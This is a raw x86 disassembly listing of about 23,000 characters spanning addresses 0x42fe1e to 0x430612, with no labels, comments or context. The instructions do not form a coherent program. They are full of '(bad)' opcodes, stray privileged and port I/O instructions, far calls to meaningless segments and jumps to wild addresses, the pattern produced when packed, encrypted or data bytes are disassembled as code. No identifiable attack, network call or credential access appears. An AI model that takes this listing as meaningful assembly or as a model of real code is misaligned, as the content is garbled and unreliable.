  42fe1e:	mov    eax,ds:0x75ad7e66
  42fe23:	push   ebp
  42fe24:	mov    edx,ecx
  42fe26:	sub    ah,BYTE PTR [ebx-0x7]
  42fe29:	rcr    DWORD PTR [edi-0x1516ff48],0x4c
  42fe30:	push   0x6663a8c7
  42fe35:	(bad)  
  42fe37:	push   ecx
  42fe38:	jo     0x42fe67
  42fe3a:	data16 jno 0x42fe18
  42fe3d:	add    eax,0xc22dd95e
  42fe42:	loop   0x42fe69
  42fe44:	jae    0x42fe68
  42fe46:	mov    ebx,0x98967655
  42fe4b:	arpl   ax,bp
  42fe4d:	in     al,0x30
  42fe4f:	arpl   cx,di
  42fe51:	ins    BYTE PTR es:[edi],dx
  42fe52:	mov    eax,ds:0x121346ee
  42fe57:	push   ebp
  42fe58:	dec    ebx
  42fe59:	xchg   ecx,eax
  42fe5a:	(bad)  
  42fe5b:	adc    eax,0x6317648c
  42fe60:	stc    
  42fe61:	data16 mov cl,0x16
  42fe64:	dec    esi
  42fe65:	pop    esi
  42fe66:	add    dl,dh
  42fe68:	ins    DWORD PTR es:[edi],dx
  42fe69:	pop    gs
  42fe6b:	popa   
  42fe6c:	pop    esp
  42fe6d:	ror    bh,0x51
  42fe70:	sti    
  42fe71:	aaa    
  42fe72:	add    BYTE PTR [edi],al
  42fe74:	cdq    
  42fe75:	iret   
  42fe76:	je     0x42fe3f
  42fe78:	pop    esi
  42fe79:	icebp  
  42fe7a:	adc    al,0x16
  42fe7c:	(bad)  
  42fe7d:	sub    ecx,ecx
  42fe7f:	popf   
  42fe80:	in     al,0x45
  42fe82:	inc    ebp
  42fe83:	and    esp,ecx
  42fe85:	inc    esp
  42fe86:	fdivr  st,st(3)
  42fe88:	push   ebx
  42fe89:	ins    DWORD PTR es:[edi],dx
  42fe8a:	ins    BYTE PTR es:[edi],dx
  42fe8b:	(bad)  
  42fe8c:	(bad)  [ebx-0x8e8a473]
  42fe92:	push   DWORD PTR [ebx+0x1a]
  42fe95:	mov    edi,0xb9e594fd
  42fe9a:	ucomiss xmm3,DWORD PTR [edx]
  42fe9d:	jle    0x42fe5f
  42fe9f:	push   cs
  42fea0:	gs sub al,al
  42fea3:	sub    eax,0x80e084e2
  42fea8:	maskmovq mm7,mm7
  42feab:	dec    esi
  42feac:	lea    esp,[ebp+0x44]
  42feaf:	jnp    0x42fe9f
  42feb1:	test   al,ah
  42feb3:	and    BYTE PTR [ebx],dl
  42feb5:	not    DWORD PTR [eax+0x14]
  42feb8:	jne    0x42feeb
  42feba:	adc    DWORD PTR [ebx-0x23],edi
  42febd:	add    eax,0xffffffcb
  42fec0:	fdiv   DWORD PTR [edx+eax*1-0x4f]
  42fec4:	push   ds
  42fec5:	lea    ecx,[ebp-0x8e32d]
  42fecb:	add    bl,al
  42fecd:	jo     0x42ff0f
  42fecf:	dec    esi
  42fed0:	dec    esi
  42fed1:	adc    ebx,DWORD PTR [eax+0x5b]
  42fed4:	rcr    BYTE PTR [esi],cl
  42fed6:	push   ebp
  42fed7:	mov    esp,edi
  42fed9:	pop    eax
  42feda:	in     eax,0x6c
  42fedc:	std    
  42fedd:	fadd   DWORD PTR [eax]
  42fedf:	lea    ebp,[esi-0x57]
  42fee2:	dec    edx
  42fee3:	push   esi
  42fee4:	mov    esp,0xb00e24f
  42fee9:	fldcw  WORD PTR [edx]
  42feeb:	(bad)  [edx+0x1a]
  42feee:	pop    edi
  42feef:	(bad)  
  42fef0:	out    0x13,eax
  42fef2:	jb     0x42ff38
  42fef4:	mov    dh,0x42
  42fef6:	dec    eax
  42fef7:	adc    al,0x46
  42fef9:	cmp    BYTE PTR [ebp+0x79a2d8ff],0xf1
  42ff00:	push   ebp
  42ff01:	(bad)  
  42ff02:	and    al,0xfe
  42ff04:	mov    ebp,0xee547272
  42ff09:	stc    
  42ff0a:	pop    eax
  42ff0b:	jmp    FWORD PTR [ebp-0x6083aa8e]
  42ff11:	aad    0x47
  42ff13:	mov    WORD PTR [edi],fs
  42ff15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff16:	mov    ah,0x51
  42ff18:	xchg   ebp,eax
  42ff19:	lea    ecx,ds:0x7a72220e
  42ff1f:	mov    edi,0x4c72eb0e
  42ff24:	jle    0x42fec7
  42ff26:	jno    0x42feb4
  42ff28:	retf   0x4885
  42ff2b:	cli    
  42ff2c:	adc    esi,DWORD PTR [ebx]
  42ff2e:	mov    edx,0x715e00fb
  42ff33:	std    
  42ff34:	call   FWORD PTR [ebp+0x42]
  42ff37:	adc    al,0xc9
  42ff39:	mov    ds:0xae743dd7,eax
  42ff3e:	std    
  42ff3f:	jp     0x42fee0
  42ff41:	dec    ecx
  42ff42:	xor    ecx,DWORD PTR [eax+0x4f]
  42ff45:	xchg   ebx,eax
  42ff46:	enter  0x6547,0x5d
  42ff4a:	enter  0xfb04,0x57
  42ff4e:	(bad)  
  42ff4f:	repz aas 
  42ff51:	(bad)  
  42ff52:	std    
  42ff53:	cmp    eax,0x7aeda674
  42ff58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ff59:	pop    ss
  42ff5a:	jecxz  0x42ffa4
  42ff5c:	dec    edi
  42ff5d:	or     eax,0xa20dcd85
  42ff62:	jb     0x42ffda
  42ff64:	inc    esp
  42ff65:	(bad)  
  42ff66:	fdiv   DWORD PTR [edi+0x5e38de76]
  42ff6c:	dec    eax
  42ff6d:	call   0xbdc1647a
  42ff72:	gs dec edx
  42ff74:	dec    eax
  42ff75:	sub    eax,0x647bdc64
  42ff7a:	sbb    eax,ebp
  42ff7c:	jle    0x42ff8b
  42ff7e:	out    dx,al
  42ff7f:	into   
  42ff80:	jl     0x42ffa0
  42ff82:	gs pop esp
  42ff84:	outs   dx,BYTE PTR ds:[esi]
  42ff85:	fstp   QWORD PTR [edi+0x22]
  42ff88:	dec    eax
  42ff89:	aas    
  42ff8a:	fs ins BYTE PTR es:[edi],dx
  42ff8c:	out    dx,eax
  42ff8d:	outs   dx,DWORD PTR ds:[esi]
  42ff8e:	push   esi
  42ff8f:	mov    fs:0x5b0a63ac,eax
  42ff95:	add    BYTE PTR [ebp-0x67fc1813],dl
  42ff9b:	xchg   edi,eax
  42ff9c:	xchg   ecx,eax
  42ff9d:	dec    eax
  42ff9e:	jbe    0x42ff91
  42ffa0:	aad    0xc3
  42ffa2:	test   DWORD PTR [edi+0xe],edx
  42ffa5:	clc    
  42ffa6:	loope  0x42ff8a
  42ffa8:	call   0xbeea61b0
  42ffad:	add    DWORD PTR [esi],0x69
  42ffb0:	out    0x82,eax
  42ffb2:	(bad)  
  42ffb3:	fs out 0x78,eax
  42ffb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ffb7:	imul   edx,DWORD PTR [edi],0x17759e79
  42ffbd:	jns    0x42ff65
  42ffbf:	ins    DWORD PTR es:[edi],dx
  42ffc0:	pop    ss
  42ffc1:	fimul  DWORD PTR [eax+0x55]
  42ffc4:	and    al,0x48
  42ffc6:	lods   eax,DWORD PTR ds:[esi]
  42ffc7:	out    dx,eax
  42ffc8:	in     eax,0xd9
  42ffca:	xor    eax,0x5646e7f1
  42ffcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ffd0:	test   bl,0x25
  42ffd3:	push   eax
  42ffd4:	pop    DWORD PTR [ecx-0x7b0c11e8]
  42ffda:	sbb    BYTE PTR [eax-0x19],dh
  42ffdd:	add    esp,DWORD PTR [edx-0x2e]
  42ffe0:	add    BYTE PTR [esp+eiz*4+0x62],ch
  42ffe4:	stc    
  42ffe5:	jmp    0x6d401562
  42ffea:	aaa    
  42ffeb:	iret   
  42ffec:	test   BYTE PTR [esi],ch
  42ffee:	data16 fld DWORD PTR [eax]
  42fff1:	sbb    dl,BYTE PTR [ecx+eiz*4+0x58d55573]
  42fff8:	mov    ebx,0xd96100e9
  42fffd:	mov    esp,DWORD PTR [ecx+ebx*1+0x1cde6712]
  430004:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430005:	scas   eax,DWORD PTR es:[edi]
  430006:	ret    
  430007:	popa   
  430008:	pop    esi
  430009:	adc    esp,ecx
  43000b:	mov    al,0xa2
  43000d:	add    BYTE PTR [esi+eiz*1-0x31],ah
  430011:	cmp    DWORD PTR [esi+0x5e],0xffffffd9
  430015:	add    BYTE PTR [edx-0x25],ah
  430018:	push   0xffffff83
  43001a:	xor    BYTE PTR [ebp+0x61e98c56],cl
  430020:	fld    DWORD PTR [ebp-0x6caa6e60]
  430026:	inc    ecx
  430027:	sub    ebx,DWORD PTR [edi-0x7]
  43002a:	sar    edi,1
  43002c:	push   ebx
  43002d:	stc    
  43002e:	fsubp  st(5),st
  430030:	and    DWORD PTR [eax+ebx*2-0x15],esi
  430034:	pop    esp
  430035:	mov    al,ds:0x8b5fa4d2
  43003a:	pop    esp
  43003b:	stc    
  43003c:	fs stc 
  43003e:	mov    esi,0xc1c65b11
  430043:	cmp    DWORD PTR [eax+0x21e2aefb],ebx
  430049:	je     0x43008b
  43004b:	mov    ebx,0xa49ca855
  430050:	pop    edi
  430051:	call   0xf9a25d50
  430056:	mov    eax,gs:0x8e0046e6
  43005c:	pop    ecx
  43005d:	xchg   ecx,eax
  43005e:	stc    
  43005f:	add    BYTE PTR [ebx+ebx*1-0x7a95aeb6],cl
  430066:	jns    0x430068
  430068:	or     esp,DWORD PTR [edx+0x61]
  43006b:	mov    esp,0x8cf995e7
  430070:	jbe    0x4300b0
  430072:	cld    
  430073:	dec    DWORD PTR [edi+eax*8-0x25cf1739]
  43007a:	cmc    
  43007b:	inc    DWORD PTR [esi+0x16]
  43007e:	outs   dx,BYTE PTR ds:[esi]
  43007f:	es mov cl,0xd5
  430082:	mov    edx,DWORD PTR [ebp-0x8eacd]
  430088:	mov    eax,0x2b7ee1a4
  43008d:	sbb    al,0xf7
  43008f:	test   BYTE PTR [ebx-0x6e],bh
  430092:	or     cl,BYTE PTR [ebx-0x6a72f202]
  430098:	adc    edx,DWORD PTR ds:0x2510fff7
  43009e:	or     DWORD PTR [ebx-0x5290286],esi
  4300a4:	mov    WORD PTR [ebx],ds
  4300a6:	div    DWORD PTR [ebp+0x73]
  4300a9:	sbb    edx,DWORD PTR ds:0xf9957840
  4300af:	mov    bh,BYTE PTR [esi]
  4300b1:	adc    DWORD PTR [eax+0x3b],eax
  4300b4:	push   es
  4300b5:	or     DWORD PTR [edi],eax
  4300b7:	or     BYTE PTR [eax+0x7afff716],0x16
  4300be:	adc    eax,0xf99d2840
  4300c3:	add    BYTE PTR [eax],0xc
  4300c6:	add    al,0xfa
  4300c8:	dec    DWORD PTR [ebx+0x66]
  4300cb:	jge    0x4300b3
  4300cd:	std    
  4300ce:	push   ss
  4300cf:	test   DWORD PTR [ebp-0xdca3a],0x65b44762
  4300d9:	arpl   sp,bx
  4300db:	inc    ebx
  4300dc:	addr16 pop ebp
  4300de:	repnz add al,0x0
  4300e1:	js     0x430155
  4300e3:	inc    esp
  4300e4:	adc    al,0x7e
  4300e6:	cmp    DWORD PTR [ebp-0x36cd1901],0x39
  4300ed:	out    0xed,eax
  4300ef:	ins    BYTE PTR es:[edi],dx
  4300f0:	clc    
  4300f1:	in     eax,dx
  4300f2:	push   DWORD PTR [eax+edx*2-0x82656d]
  4300f9:	fnsave [esi-0x2b]
  4300fc:	mov    ebx,0x8cfd32fe
  430101:	not    DWORD PTR [edx+0x47]
  430104:	cli    
  430105:	lds    esp,FWORD PTR [ebx+0x36]
  430108:	out    0x4e,eax
  43010a:	outs   dx,BYTE PTR ds:[esi]
  43010b:	inc    esp
  43010c:	cli    
  43010d:	fbstp  TBYTE PTR [edx+0x723815d0]
  430113:	jb     0x4300a9
  430115:	retf   0x43c9
  430118:	cli    
  430119:	push   ecx
  43011a:	mov    ecx,0xd8f5ea5c
  43011f:	inc    ebx
  430120:	or     dl,ah
  430122:	mov    ebx,0x70f8bf80
  430127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430128:	or     al,BYTE PTR [eax]
  43012a:	daa    
  43012b:	retf   0xbe76
  43012e:	mov    DWORD PTR [edi+ecx*1-0x40],esi
  430132:	or     eax,0xa1c8a7a0
  430137:	icebp  
  430138:	push   ecx
  430139:	xchg   DWORD PTR [ebp+0x72],ebp
  43013c:	std    
  43013d:	mov    esi,fs
  43013f:	int    0x50
  430141:	dec    DWORD PTR [ebp+0x72]
  430144:	mov    al,0x54
  430146:	lods   al,BYTE PTR ds:[esi]
  430147:	call   0x8b72:0x72621ed7
  43014e:	jle    0x430129
  430150:	jne    0x430153
  430152:	(bad)  
  430153:	(bad)  [edi-0x6d9fae09]
  430159:	js     0x4301b1
  43015b:	popa   
  43015c:	clc    
  43015d:	ret    
  43015e:	adc    eax,0x3510dbf2
  430163:	(bad)  
  430164:	fs inc ebx
  430166:	lea    edx,[ecx]
  430168:	sbb    eax,0x3b5a977
  43016d:	mov    bl,0xa5
  43016f:	dec    esi
  430170:	imul   ebx,DWORD PTR [edi],0xffffffc8
  430173:	(bad)  
  430175:	add    edx,DWORD PTR [edx-0x4cbb48f4]
  43017b:	push   ebp
  43017c:	daa    
  43017d:	lds    edx,FWORD PTR [edx+0x21a800f7]
  430183:	push   DWORD PTR [ebx-0x4b697308]
  430189:	sbb    eax,0x7ac1928d
  43018e:	add    BYTE PTR [ecx],ch
  430190:	adc    eax,0xb5217688
  430195:	xchg   DWORD PTR [ebx-0x407c1b11],esi
  43019b:	popf   
  43019c:	dec    esp
  43019d:	pop    ebx
  43019e:	pop    ds
  43019f:	data16 fsub st,st(7)
  4301a2:	add    edi,DWORD PTR [edx+0x1e]
  4301a5:	and    eax,DWORD PTR [esi-0x78]
  4301a8:	push   ebp
  4301a9:	daa    
  4301aa:	hlt    
  4301ab:	(bad)  
  4301ac:	cwde   
  4301ad:	arpl   WORD PTR [ebx-0x12],ax
  4301b0:	rcl    BYTE PTR [esi],cl
  4301b2:	inc    esp
  4301b3:	add    edx,DWORD PTR [edx+0x63]
  4301b6:	call   0x42ada18
  4301bb:	out    dx,eax
  4301bc:	push   ebp
  4301bd:	add    ecx,DWORD PTR [ecx+eiz*2]
  4301c0:	(bad)  
  4301c2:	ror    DWORD PTR [eax-0x3b],cl
  4301c5:	stos   DWORD PTR es:[edi],eax
  4301c6:	pop    ss
  4301c7:	mov    ds:0xd26400d9,al
  4301cc:	mov    edx,0xd961ebae
  4301d1:	call   0xf9a5574e
  4301d6:	fs sahf 
  4301d8:	out    0x48,al
  4301da:	cmp    al,0xf3
  4301dc:	adc    ah,BYTE PTR ds:0x8c0f2ef5
  4301e2:	ins    DWORD PTR es:[edi],dx
  4301e3:	cli    
  4301e4:	and    dh,bh
  4301e6:	call   0x1a910b4c
  4301eb:	mov    eax,ds:0x20a98388
  4301f0:	stos   BYTE PTR es:[edi],al
  4301f1:	bound  esp,QWORD PTR [eax]
  4301f3:	add    BYTE PTR [edx],al
  4301f5:	sbb    ecx,DWORD PTR [ebx]
  4301f7:	aad    0x54
  4301f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4301fa:	ret    
  4301fb:	aam    0xcb
  4301fd:	scas   eax,DWORD PTR es:[edi]
  4301fe:	mov    edi,0xd94512e6
  430204:	repnz sbb ah,BYTE PTR ds:0x7c24b1d9
  43020b:	(bad)  
  43020c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43020d:	pop    esi
  43020e:	mov    WORD PTR [ebp-0x36],ds
  430211:	(bad)  
  430212:	std    
  430213:	call   0x258d7379
  430218:	and    esp,DWORD PTR [ebx-0x7d]
  43021b:	sub    DWORD PTR [ecx+0x44],esi
  43021e:	shl    BYTE PTR [ebp+0x1e],0xe5
  430222:	push   es
  430223:	mov    edx,0x6587f821
  430228:	jp     0x430290
  43022a:	std    
  43022b:	call   0xc5c74e91
  430230:	cmp    DWORD PTR [edi-0x7],ebx
  430233:	jmp    0xad5665c9
  430238:	dec    esp
  430239:	sbb    DWORD PTR [ecx],eax
  43023b:	push   0x72
  43023d:	test   eax,0x5f5e256c
  430242:	cli    
  430243:	add    BYTE PTR [esi-0x56],cl
  430246:	imul   eax,DWORD PTR [ebx+edi*1+0x1b],0x15
  43024b:	mov    al,0x19
  43024d:	call   0x3d:0x23efa0f9
  430254:	mov    eax,0x74f6a2
  430259:	xor    ch,BYTE PTR [esi+esi*8]
  43025c:	push   eax
  43025d:	hlt    
  43025e:	ror    BYTE PTR [eax-0x172ab4ee],0x11
  430265:	push   esi
  430266:	sbb    dh,bh
  430268:	lea    esi,[edi+0x76]
  43026b:	add    DWORD PTR [edi],eax
  43026d:	or     ebx,edx
  43026f:	call   0xf75ac8d5
  430274:	lea    esi,[edi+0x76]
  430277:	icebp  
  430278:	add    edi,ebx
  43027a:	fld1   
  43027c:	push   ebp
  43027d:	jbe    0x43029a
  43027f:	test   DWORD PTR [ebp+0x2cb7637],0xdee8d9bb
  430289:	test   eax,0x8b85f71a
  43028e:	and    dl,BYTE PTR [edx+0x55]
  430291:	push   ss
  430292:	mov    ds,WORD PTR ds:0x8c89ea3c
  430298:	test   BYTE PTR [edi-0x74000409],bl
  43029e:	mov    DWORD PTR [edx+0x53],ecx
  4302a1:	add    BYTE PTR fs:[ebp+0x5f95e5c0],al
  4302a8:	cmp    edi,esp
  4302aa:	xchg   ebp,eax
  4302ab:	das    
  4302ac:	je     0x43022e
  4302ae:	pop    esi
  4302af:	les    edi,FWORD PTR [ebp-0x4e]
  4302b2:	enterw 0xf266,0x88
  4302b7:	cmp    eax,0x1d40f638
  4302bc:	mov    BYTE PTR [eax],al
  4302be:	bound  esi,QWORD PTR [edx-0x3]
  4302c1:	call   FWORD PTR [ebx]
  4302c3:	xchg   esi,eax
  4302c4:	add    al,0x0
  4302c6:	bound  ecx,QWORD PTR [edx+0x1c47be1e]
  4302cc:	mov    DWORD PTR [ebx-0x7a],eax
  4302cf:	push   0xffffffcd
  4302d1:	mov    esi,cs
  4302d3:	(bad)  
  4302d4:	nop
  4302d5:	jmp    FWORD PTR ds:0x7e8b8a73
  4302db:	pushw  es
  4302dd:	add    BYTE PTR [edx+0x5a],ah
  4302e0:	mov    WORD PTR [esi-0x407eb3e9],?
  4302e6:	pop    ebp
  4302e7:	std    
  4302e8:	inc    esp
  4302e9:	and    DWORD PTR [edx],0x66
  4302ec:	or     ebp,DWORD PTR [edi]
  4302ee:	and    cl,ch
  4302f0:	test   DWORD PTR [ebx+0x6823e],eax
  4302f6:	(bad)  
  4302f7:	in     eax,0x88
  4302f9:	and    edx,DWORD PTR [edx+0x69]
  4302fc:	std    
  4302fd:	push   DWORD PTR [edx]
  4302ff:	call   0x143f:0xf262fffe
  430306:	mov    ds:0xd8ffbd7f,al
  43030b:	gs mov ecx,0x8a722214
  430311:	cmp    DWORD PTR [esi+0x72],0x7
  430315:	add    BYTE PTR [edx+0x22],ah
  430318:	mov    al,BYTE PTR [ebx+0x86e7e]
  43031e:	bound  esp,QWORD PTR [edx]
  430320:	inc    eax
  430321:	rol    DWORD PTR [eax],1
  430323:	out    0xf6,eax
  430325:	call   0xfdb56419
  43032a:	dec    edi
  43032b:	xlat   BYTE PTR ds:[ebx]
  43032c:	imul   al
  43032e:	sti    
  43032f:	popa   
  430330:	jb     0x43032f
  430332:	dec    edi
  430333:	jne    0x4302f9
  430335:	mov    DWORD PTR [ebx+0x397d946],edx
  43033b:	(bad)  
  43033c:	fldenv [eax-0x18a3a2b3]
  430342:	sub    esi,DWORD PTR [esi-0x21bf3366]
  430348:	push   esp
  430349:	or     esi,DWORD PTR [edi+eax*2]
  43034c:	pop    esp
  43034d:	out    0xd3,eax
  43034f:	out    dx,al
  430350:	push   esp
  430351:	or     ecx,DWORD PTR [eax]
  430353:	pusha  
  430354:	(bad)  
  430356:	rcr    esi,cl
  430358:	push   esp
  430359:	retf   
  43035a:	cmp    esp,DWORD PTR [edi]
  43035c:	pop    esp
  43035d:	out    0xd3,eax
  43035f:	out    dx,al
  430360:	push   esp
  430361:	retf   
  430362:	punpcklbw mm3,mm1
  430365:	out    0xd3,eax
  430367:	ficom  WORD PTR [ebx+ecx*8+0x43]
  43036b:	add    eax,0xeed3e75c
  430370:	push   esp
  430371:	retf   
  430372:	out    dx,eax
  430373:	pop    esp
  430374:	(bad)  
  430376:	stos   DWORD PTR es:[edi],eax
  430377:	jno    0x43034e
  430379:	out    0x3,eax
  43037b:	xchg   edx,eax
  43037c:	jno    0x43038b
  43037e:	mov    ebp,0x47665bdd
  430383:	jns    0x4303db
  430385:	daa    
  430386:	rol    DWORD PTR [eax],0x59
  430389:	dec    esi
  43038a:	jae    0x430373
  43038c:	ins    DWORD PTR es:[edi],dx
  43038d:	shl    bh,1
  43038f:	add    ecx,edx
  430391:	lock fld QWORD PTR [eax-0x48]
  430395:	push   edi
  430396:	in     al,dx
  430397:	aaa    
  430398:	aas    
  430399:	adc    eax,0xd42e40e8
  43039e:	mov    dh,0x40
  4303a0:	jbe    0x4303e3
  4303a2:	clc    
  4303a3:	ret    
  4303a4:	xchg   ebp,eax
  4303a5:	and    cl,bh
  4303a7:	add    DWORD PTR [edx-0x27],esp
  4303aa:	je     0x430333
  4303ac:	inc    ecx
  4303ad:	fld1   
  4303af:	add    esp,DWORD PTR [edx+0x51]
  4303b2:	add    cl,dl
  4303b4:	mov    eax,ds:0x82f37410
  4303b9:	cld    
  4303ba:	mov    al,0xe8
  4303bc:	mov    BYTE PTR [eax-0x3c],bl
  4303bf:	jno    0x43042e
  4303c1:	fld    DWORD PTR [eax]
  4303c3:	stos   BYTE PTR es:[edi],al
  4303c4:	sub    al,0x54
  4303c6:	out    dx,eax
  4303c7:	bound  ebx,QWORD PTR [ebx+edx*8]
  4303ca:	call   0x11c684d
  4303cf:	jb     0x4303fd
  4303d1:	iret   
  4303d2:	call   0x11c585d
  4303d7:	push   0x4
  4303d9:	rol    DWORD PTR [eax],cl
  4303db:	push   0xfffffffc
  4303dd:	into   
  4303de:	add    BYTE PTR [edi],bh
  4303e0:	mov    eax,ds:0xe1858605
  4303e5:	jbe    0x4303df
  4303e7:	push   0xe8ffb652
  4303ec:	add    BYTE PTR [ecx-0x56],ah
  4303ef:	shr    BYTE PTR [ecx+0x23],0xd3
  4303f3:	call   FWORD PTR [ecx]
  4303f5:	or     al,0x8
  4303f7:	xchg   BYTE PTR [eax+0x5d],dh
  4303fa:	push   esp
  4303fb:	enter  0x61eb,0xd9
  4303ff:	test   DWORD PTR [ebp+ebp*2+0x60f95b52],ebp
  430406:	add    BYTE PTR [ebp+0x24fedf58],0xe1
  43040d:	(bad)  
  43040e:	push   ss
  43040f:	and    eax,0x993b8d9
  430414:	push   0x44
  430416:	pop    esp
  430417:	stc    
  430418:	jmp    0xadcbdcf8
  43041d:	mov    ebp,0x6cf03ccf
  430422:	fist   DWORD PTR [ecx-0x7a269e15]
  430428:	and    bh,BYTE PTR [ecx-0x70]
  43042b:	jge    0x43042d
  43042d:	(bad)
  430432:	aad    0x0
  430434:	add    BYTE PTR [eax],al
  430436:	sar    DWORD PTR [ecx-0x10],cl
  430439:	scas   eax,DWORD PTR es:[edi]
  43043a:	fnstenv [edi+0x53]
  43043d:	xchg   DWORD PTR ss:[ebp+0xb],ebp
  430441:	jle    0x4303dc
  430443:	inc    eax
  430444:	push   ebx
  430445:	cwde   
  430446:	retf   0x9283
  430449:	cmp    edx,esi
  43044b:	add    BYTE PTR [edx+0x203cd175],cl
  430451:	add    BYTE PTR [edi-0x39],dh
  430454:	cmp    al,0x9
  430456:	outs   dx,DWORD PTR ds:[esi]
  430457:	sar    DWORD PTR [ecx*1-0x41fa3083],1
  43045e:	sti    
  43045f:	fdiv   st,st(5)
  430461:	add    BYTE PTR [ebx],cl
  430463:	(bad)  
  430464:	jae    0x4304df
  430466:	mov    BYTE PTR [eax*1+0xaaed58b],dl
  43046d:	mov    dh,ch
  43046f:	pop    ecx
  430470:	or     al,0x74
  430472:	sbb    bl,BYTE PTR [edx+0x3]
  430475:	je     0x430475
  430477:	pop    ecx
  430478:	sbb    DWORD PTR [edi],ecx
  43047a:	jns    0x430411
  43047c:	sti    
  43047d:	(bad)  
  43047e:	sti    
  43047f:	xchg   ebx,eax
  430480:	xor    dh,bl
  430482:	mov    ecx,0xbcf332ac
  430487:	push   ecx
  430488:	cmp    BYTE PTR [edx],al
  43048a:	mov    ebx,0xccf231d5
  43048f:	push   ecx
  430490:	pop    ss
  430491:	add    cl,bl
  430493:	aad    0x81
  430495:	(bad)  
  430496:	mov    eax,ds:0xcbc221d5
  43049b:	fsub   st(0),st
  43049d:	std    
  43049e:	mov    ebx,0xe924e8d5
  4304a3:	aad    0x0
  4304a5:	mov    esp,DWORD PTR [edx-0x58]
  4304a8:	mov    dh,dl
  4304aa:	pop    ebp
  4304ab:	hlt    
  4304ac:	adc    al,0xfe
  4304ae:	test   DWORD PTR [edi-0x7a],ebp
  4304b1:	(bad)  
  4304b2:	mov    al,bh
  4304b4:	mov    ah,0xff
  4304b6:	add    BYTE PTR [ebp-0x11],dh
  4304b9:	mov    ecx,0xb8455d23
  4304be:	or     al,0xd9
  4304c0:	mov    ds:0x5626e80c,al
  4304c5:	std    
  4304c6:	(bad)  
  4304c7:	jmp    0x4304d8
  4304c9:	or     eax,0xcbbb59e7
  4304ce:	or     edi,DWORD PTR [edx]
  4304d0:	fcomp  DWORD PTR [ecx]
  4304d2:	add    BYTE PTR [edx-0x37],ah
  4304d5:	fisttp DWORD PTR [ebx]
  4304d7:	jmp    0xa45aedca
  4304dc:	sbb    DWORD PTR [ebx-0x1],ebx
  4304df:	and    eax,0x46438743
  4304e4:	inc    edi
  4304e5:	xchg   DWORD PTR [edx+0x72],edx
  4304e8:	(bad)  
  4304e9:	dec    esi
  4304ea:	or     ah,bh
  4304ec:	cmp    ebp,0xffffffff
  4304ef:	(bad)
  4304f4:	sbb    ecx,edi
  4304f6:	outs   dx,BYTE PTR ds:[esi]
  4304f8:	inc    esi
  4304f9:	stc    
  4304fa:	dec    edi
  4304fb:	ja     0x43048e
  4304fd:	jge    0x430578
  4304ff:	arpl   WORD PTR [edi+0x38e226b2],dx
  430505:	inc    DWORD PTR [ebx+0x4f]
  430508:	in     eax,0x86
  43050a:	inc    ecx
  43050b:	popa   
  43050c:	out    0xe4,al
  43050e:	jae    0x430580
  430510:	fiadd  WORD PTR ds:0xa56667c
  430516:	jp     0x430580
  430518:	aas    
  430519:	jnp    0x4304da
  43051b:	add    BYTE PTR [edi+0x7],ch
  43051e:	add    eax,0x9cd96200
  430523:	push   fs
  430525:	mov    al,ds:0x1f14a7f7
  43052a:	jmp    0x430556
  43052c:	(bad)  
  43052e:	out    0x3,eax
  430530:	fisubr WORD PTR [ebx]
  430532:	repnz xchg dh,bh
  430535:	(bad)  
  430537:	add    esi,ebp
  430539:	push   ecx
  43053a:	in     al,dx
  43053b:	mov    cl,0x2a
  43053d:	fs loope 0x4304c0
  430540:	jne    0x430547
  430542:	and    eax,0x24a9babc
  430547:	mov    eax,0xc73e1680
  43054c:	mov    ds:0x86e453ad,al
  430551:	aad    0x28
  430553:	rcl    DWORD PTR [ebx-0x5c762532],1
  430559:	(bad)  
  43055b:	jecxz  0x43050e
  43055d:	jmp    0x43054a
  43055f:	or     ah,BYTE PTR [esi-0x67f11c23]
  430565:	jecxz  0x430551
  430567:	jge    0x43053e
  430569:	adc    eax,0xd9620393
  43056e:	adc    al,0x6
  430570:	and    BYTE PTR [eax-0x5dfb5829],ah
  430576:	arpl   WORD PTR [ecx+0x68],dx
  430579:	pop    esi
  43057a:	mov    edx,0x66d96202
  43057f:	cmp    al,BYTE PTR [eax]
  430581:	pop    esi
  430582:	call   0xd9a5f2ec
  430587:	out    0x88,eax
  430589:	arpl   WORD PTR [edi+edx*2-0x11],bx
  43058d:	mov    ds,eax
  43058f:	mov    bl,0xc2
  430591:	xor    ebp,ecx
  430593:	out    dx,al
  430594:	(bad)  
  430595:	sbb    eax,0x68d796a2
  43059a:	pop    esi
  43059b:	add    dh,bl
  43059d:	pusha  
  43059e:	fld    DWORD PTR [eax]
  4305a0:	arpl   WORD PTR [edi-0x2a36c325],bx
  4305a6:	jmp    0xdc18f5e7
  4305ab:	cmp    al,0xe4
  4305ad:	iret   
  4305ae:	loope  0x4305b9
  4305b0:	dec    edi
  4305b1:	and    DWORD PTR ds:0xd961e9fa,edx
  4305b7:	or     DWORD PTR [ebx+edi*1+0x58],esp
  4305bb:	stc    
  4305bc:	jmp    0x8453a0e8
  4305c1:	loop   0x4305dc
  4305c3:	add    esi,DWORD PTR [edx-0x60]
  4305c6:	inc    DWORD PTR [ebx-0x13]
  4305c9:	(bad)  
  4305cb:	or     cl,ch
  4305cd:	ficomp WORD PTR [edx+0x5d58f924]
  4305d3:	jecxz  0x4305be
  4305d5:	popa   
  4305d6:	fnstcw WORD PTR [ebp+0x3e]
  4305d9:	push   0xffffffd9
  4305db:	or     DWORD PTR [ebp-0x73],ebp
  4305de:	push   esi
  4305df:	stc    
  4305e0:	jmp    0x6d53a1bc
  4305e5:	add    BYTE PTR [esi+0x5ead84e3],ah
  4305eb:	fld    DWORD PTR [eax]
  4305ed:	add    esp,DWORD PTR [esi+0x15]
  4305f0:	gs xor edx,edx
  4305f3:	loop   0x4305e7
  4305f5:	cs (bad) 
  4305f7:	fmul   DWORD PTR [ecx]
  4305f9:	push   esp
  4305fa:	sahf   
  4305fb:	xlat   BYTE PTR ds:[ebx]
  4305fc:	shr    BYTE PTR [edi*1+0x6226f2dc],0xd8
  430604:	or     DWORD PTR [esi+eiz*1-0x29],edi
  430608:	shr    BYTE PTR [edx+0x64c88a68],0xb2
  43060f:	cli    
  430610:	cmp    al,0x41
  430612:	jl     0x4305a4
